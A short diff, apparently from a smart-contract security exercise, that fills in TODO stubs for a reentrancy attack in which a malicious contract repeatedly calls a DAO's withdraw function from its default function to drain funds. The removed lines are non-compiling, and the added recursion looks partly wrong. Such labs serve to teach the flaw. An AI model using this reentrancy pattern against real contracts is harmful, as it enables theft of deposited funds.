@@ -18,13 +18,9 @@ def _attack() -> bool:
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
     
-    uint public a = 0;
-    while (a<5) {
-        a++;
-        if a == 4
-        dao_adress.withdraw
     
-    
+    if userBalance(dao_address) > 0:
+        dao_address.withdraw(1)
 
     return True
 
@@ -56,4 +52,5 @@ def __default__():
     
     # TODO: Add code here to complete the recursive call
 
-    pass
+    dao_address._attack()
+    
